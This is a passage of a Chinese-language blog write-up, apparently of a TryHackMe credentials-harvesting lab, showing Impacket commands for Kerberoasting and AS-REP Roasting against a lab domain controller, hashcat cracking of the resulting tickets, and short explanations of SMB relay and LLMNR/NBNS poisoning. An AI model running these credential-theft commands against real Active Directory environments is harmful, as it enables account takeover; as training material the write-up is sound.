<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305162231942.png" alt="image-20240305162231942"></p>
<blockquote>
<p>目标域控制器的服务主体名称(Service Principal Name-SPN)是：svc-thm</p>
</blockquote>
<p>上面的命令很简单：我们只需要提供目标域控制器的IP地址和相关的<code>domain name\user name</code>，然后GetUserSPNs脚本就会请求我们输入用户密码以检索我们所想要获取的信息。</p>
<p>上面的输出结果显示了一个名为<code>svc-thm</code>的SPN帐户，在找到该SPN用户之后，我们可以使用-request-user参数来发送单个请求，从而为srv-user用户获取TGS票据。</p>
<pre><code class="hljs scss">#请求一个作为SPN帐户的TGS票据
#此处可能需要修改攻击机上的host文件：<span class="hljs-number">10.10</span><span class="hljs-selector-class">.192</span><span class="hljs-selector-class">.231</span> THM<span class="hljs-selector-class">.red</span> svc-thm<span class="hljs-selector-class">.THM</span><span class="hljs-selector-class">.red</span>

python3<span class="hljs-selector-class">.9</span> /opt/impacket/examples/GetUserSPNs<span class="hljs-selector-class">.py</span> -dc-ip MACHINE_IP THM<span class="hljs-selector-class">.red</span>/thm -request-user svc-thm

python3 ./impacket/examples/GetUserSPNs<span class="hljs-selector-class">.py</span> -dc-ip <span class="hljs-number">10.10</span><span class="hljs-selector-class">.192</span><span class="hljs-selector-class">.231</span> THM<span class="hljs-selector-class">.red</span>/thm -request-user svc-thm
<span class="hljs-selector-id">#Password</span>：Passw0rd!</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305162519619.png" alt="image-20240305162519619"></p>
<p>然后，我们就可以使用HashCat工具中的<code>-m 13100</code>模式来破解我们已经获取的TGS票据：</p>
<pre><code class="hljs scss">#使用Hashcat破解TGS票据
vim spn<span class="hljs-selector-class">.hash</span>
hashcat -<span class="hljs-selector-tag">a</span> <span class="hljs-number">0</span> -m <span class="hljs-number">13100</span> spn<span class="hljs-selector-class">.hash</span> /usr/share/wordlists/rockyou<span class="hljs-selector-class">.txt</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305162948591.png" alt="image-20240305162948591"></p>
<p>执行Kerberoasting攻击以获取TGS票据，然后破解TGS票据，我们最终得到的明文密码为：Passw0rd1</p>
<h2 id="as-rep-roasting攻击">AS-REP Roasting攻击</h2>
<p>AS-REP Roasting技术将使得攻击者能够检索帐户选项被设置为“不需要Kerberos预认证”的AD用户的密码哈希，此帐户选项依赖于旧的Kerberos身份验证协议，它能够允许在没有密码的情况下进行身份验证。一旦我们通过AS-REP Roasting技术获得用户的哈希值，我们就可以尝试进行离线破解，如果相关的哈希值是可破解的，那么我们就能够成功得到一个明文的用户密码。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305163118969.png" alt="image-20240305163118969"></p>
<p>在执行AS-REP Roasting之前，我们通常还需要执行枚举步骤以收集相关的目标域帐户列表，在本例中，我们将在攻击机中的TMP目录下创建一个现成的关于目标网络的域帐户列表-users.txt，下面是该列表的内容(在实际情况下该列表应该通过信息枚举获得)。</p>
<pre><code class="hljs scss">Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305163220509.png" alt="image-20240305163220509"></p>
<p>注意：在本文相关的实验环境中存在配置了“不需要Kerberos预认证”的AD用户，因此我们能够尝试针对目标机器执行AS-REP Roasting。</p>
<p>接下来，我们将使用Impacket中的Get-NPUsers脚本，如下所示：</p>
<pre><code class="hljs scss">#对目标用户列表执行AS-REP Roasting攻击

python3<span class="hljs-selector-class">.9</span> /opt/impacket/examples/GetNPUsers<span class="hljs-selector-class">.py</span> -dc-ip MACHINE_IP thm<span class="hljs-selector-class">.red</span>/ -usersfile /tmp/users<span class="hljs-selector-class">.txt</span>

python3 ./impacket/examples/GetNPUsers<span class="hljs-selector-class">.py</span> -dc-ip <span class="hljs-number">10.10</span><span class="hljs-selector-class">.192</span><span class="hljs-selector-class">.231</span> thm<span class="hljs-selector-class">.red</span>/ -usersfile /tmp/users<span class="hljs-selector-class">.txt</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305163335507.png" alt="image-20240305163335507"></p>
<p>在上述命令中，我们使用了<code>-dc-ip</code>参数来指定目标域控制器的IP地址，并且为脚本提供了一个可供检查的域用户列表，一旦GetNPUsers.py脚本在执行时找到了没有Kerberos预认证配置的正确用户，那么此脚本就会为我们生成相关的票据。</p>
<p>我们可以使用Impacket GetNPUsers脚本的<code>-format</code>参数将票据导出为适配John或者hashcat的格式，然后再使用Rubeus和Hashcat等工具来尝试破解我们从目标Active Directory环境中所获取的TGTs。</p>
<p>有关AS-REP Roasting攻击的更多详细信息，请尝试阅读以下博客内容：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/16795349.html">【THM】Attacktive Directory(AD域渗透基础)-练习</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/16800918.html">【THM】Attacking Kerberos(Kerberos渗透基础)-学习</a></li>
</ul>
<h2 id="smb-relay-attacksmb中继攻击">SMB Relay Attack(SMB中继攻击)</h2>
<p>SMB Relay攻击的原理是滥用NTLM认证机制(NTLM质询-响应协议)，攻击者会通过执行中间人攻击来监控和捕获SMB报文并提取哈希值。为了使这种攻击生效，攻击者还必须确保目标机器的SMB签名已经被禁用，SMB签名是一种针对信息完整性的安全检查，可用于确保通信在受信任的源(客户端、服务端)之间进行。</p>
<p>有关SMB中继攻击的更多详细信息，请尝试阅读以下博客内容：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17476449.html">【THM】Exploiting Active Directory(利用AD域错误配置)-红队</a></li>
</ul>
<h2 id="llmnrnbns投毒攻击">LLMNR/NBNS投毒攻击</h2>
<p>LLMNR (Link-Local Multicast Name Resolution-链路本地组播名称解析)和NBT-NS (NetBIOS Name Service-NetBIOS名称服务)可以帮助本地网络中的计算机在DNS查询失败时找到正确的机器；例如，假设某网络中的一台机器想要在没有现有的DNS记录的情况下进行通信(即DNS解析失败)，那么该机器就可以通过LLMNR或者NBT-NS向所有本地网络中的其他机器发送多播消息，以请求获取正确的地址。</p>
<p>LLMNR/NBNS投毒攻击发生在攻击者试图欺骗目标网络上的权威源，并使用主机标识服务对请求主机的链路本地多播名称解析(LLMNR)和NetBIOS名称服务(NBT-NS)的流量进行响应时。如果想了解更多有关此类攻击的信息，建议查看以下博客内容：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17418029.html">【THM】Breaching Active Directory(入侵活动目录)-红队</a></li>
</ul>
<p>SMB中继攻击和LLMNR/NBNS投毒攻击的最终目标都是为了捕获目标用户用于身份验证的NTLM哈希，这有助于我们获得对于目标帐户或者目标机器的访问权限。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240305163748088.png" alt="image-20240305163748088"></p>
<h1 id="0x10-总结">0x10 总结</h1>
<p>在本文中，我们讨论了攻击者用于获取用户凭据的各种方法，包括从本地计算机和域控制器中获取凭据，总结如下：</p>
<ul>
<li>我们讨论了如何访问Windows内存、转储LSASS进程并提取用于身份验证的哈希值。</li>
<li>我们讨论了Windows凭据管理器以及从中提取密码信息的方法。</li>
<li>我们介绍了Windows LAPS特性，并通过枚举它来找到正确的用户和目标从而尝试提取相关的密码信息。</li>
<li>我们介绍了能够用于实现转储和提取用户凭据的AD攻击。</li>
</ul>
<p>以下工具可用于扫描目标计算机(探测文件、内存等)以查找敏感信息，建议在进行信息枚举时使用：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/SnaffCon/Snaffler">Snaffler</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">Seatbelt</a></li>
<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/post-exploitation-on-saved-password-with-lazagne/">Lazagne</a></li>
</ul>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/03/10/thm-pickle-rick/">THM-Pickle_Rick</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/03/03/swpuctf/">2024-03-03</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0%E5%87%AD%E8%AF%81%E6%94%B6%E9%9B%86"><span class="toc-text">欢迎来到凭证收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-text">学习目标</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86%E4%BB%8B%E7%BB%8D%E5%92%8C%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="toc-text">0x02 凭据收集介绍和实验环境部署</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%87%AD%E6%8D%AE%E8%AE%BF%E9%97%AE"><span class="toc-text">0x03 凭据访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A5%E6%98%8E%E6%96%87%E6%96%87%E4%BB%B6%E5%BD%A2%E5%BC%8F%E5%AD%98%E5%82%A8%E5%87%AD%E6%8D%AE"><span class="toc-text">以明文文件形式存储凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E5%BD%A2%E5%BC%8F%E5%AD%98%E5%82%A8%E5%87%AD%E6%8D%AE"><span class="toc-text">以数据库文件形式存储凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81%E7%AE%A1%E7%90%86%E5%99%A8%E6%9D%A5%E5%AD%98%E5%82%A8%E5%87%AD%E6%8D%AE"><span class="toc-text">使用密码管理器来存储凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%86%85%E5%AD%98%E8%BD%AC%E5%82%A8%E8%8E%B7%E5%8F%96%E5%87%AD%E6%8D%AE"><span class="toc-text">通过内存转储获取凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-text">活动目录中的凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E8%8E%B7%E5%8F%96%E5%87%AD%E6%8D%AE"><span class="toc-text">通过网络嗅探获取凭据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%9C%AC%E5%9C%B0windows%E5%87%AD%E6%8D%AE"><span class="toc-text">0x04 本地Windows凭据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8"><span class="toc-text">键盘记录器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%B8%90%E6%88%B7%E7%AE%A1%E7%90%86%E5%99%A8sam-security-account-manager"><span class="toc-text">安全帐户管理器(SAM-Security Account Manager)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hashdump%E8%8E%B7%E5%8F%96sam%E6%96%87%E4%BB%B6"><span class="toc-text">使用HashDump获取SAM文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%8D%B7%E5%BD%B1%E5%A4%8D%E5%88%B6%E6%9C%8D%E5%8A%A1%E8%8E%B7%E5%8F%96sam%E6%96%87%E4%BB%B6"><span class="toc-text">通过卷影复制服务获取SAM文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%85%8D%E7%BD%AE%E5%8D%95%E5%85%83%E8%8E%B7%E5%8F%96sam%E6%96%87%E4%BB%B6"><span class="toc-text">通过注册表配置单元获取SAM文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-lsass%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E5%AD%90%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-text">0x05 LSASS(本地安全认证子系统服务)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFlsass"><span class="toc-text">什么是LSASS？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9B%BE%E5%BD%A2%E7%94%A8%E6%88%B7%E7%95%8C%E9%9D%A2gui"><span class="toc-text">使用图形用户界面(GUI)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%86%85%E9%83%A8%E5%A5%97%E4%BB%B6"><span class="toc-text">使用系统内部套件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8mimikatz"><span class="toc-text">使用MimiKatz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%97%E4%BF%9D%E6%8A%A4%E7%9A%84lsass%E8%BF%9B%E7%A8%8B"><span class="toc-text">受保护的LSASS进程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-windows%E5%87%AD%E6%8D%AE%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-text">0x06 Windows凭据管理器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%87%AD%E6%8D%AE%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-text">什么是凭据管理器？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%87%AD%E6%8D%AE%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-text">访问凭据管理器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8powershell%E8%84%9A%E6%9C%AC%E8%BD%AC%E5%82%A8%E5%87%AD%E6%8D%AE"><span class="toc-text">使用PowerShell脚本转储凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8runas%E8%BD%AC%E5%82%A8%E5%B9%B6%E5%88%A9%E7%94%A8%E5%87%AD%E6%8D%AE"><span class="toc-text">使用runas转储并利用凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8mimikatz%E8%BD%AC%E5%82%A8%E5%87%AD%E6%8D%AE"><span class="toc-text">使用Mimikatz转储凭据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-text">0x07 域控制器中的凭据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ntds-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-text">NTDS 域控制器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ntdsutil%E4%BB%8B%E7%BB%8D"><span class="toc-text">Ntdsutil介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%82%A8%E6%94%BB%E5%87%BB%E8%80%85%E6%97%A0%E5%87%AD%E6%8D%AE"><span class="toc-text">本地转储(攻击者无凭据)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%82%A8%E6%94%BB%E5%87%BB%E8%80%85%E6%9C%89%E5%87%AD%E6%8D%AE"><span class="toc-text">远程转储(攻击者有凭据)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dc-syncdc%E5%90%8C%E6%AD%A5"><span class="toc-text">DC Sync(DC同步)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-laps%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-text">0x08 LAPS(本地管理员密码解决方案)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9gpp"><span class="toc-text">组策略首选项(GPP)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88laps%E4%BB%8B%E7%BB%8D"><span class="toc-text">本地管理员密码解决方案(LAPS)介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%9A%E4%B8%BElaps"><span class="toc-text">枚举LAPS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-text">获取密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%94%E9%A2%98"><span class="toc-text">答题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E5%85%B6%E4%BB%96ad%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86%E6%96%B9%E5%BC%8F"><span class="toc-text">0x09 其他AD凭据收集方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-text">Kerberoasting攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#as-rep-roasting%E6%94%BB%E5%87%BB"><span class="toc-text">AS-REP Roasting攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smb-relay-attacksmb%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-text">SMB Relay Attack(SMB中继攻击)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#llmnrnbns%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB"><span class="toc-text">LLMNR&#x2F;NBNS投毒攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-%E6%80%BB%E7%BB%93"><span class="toc-text">0x10 总结</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
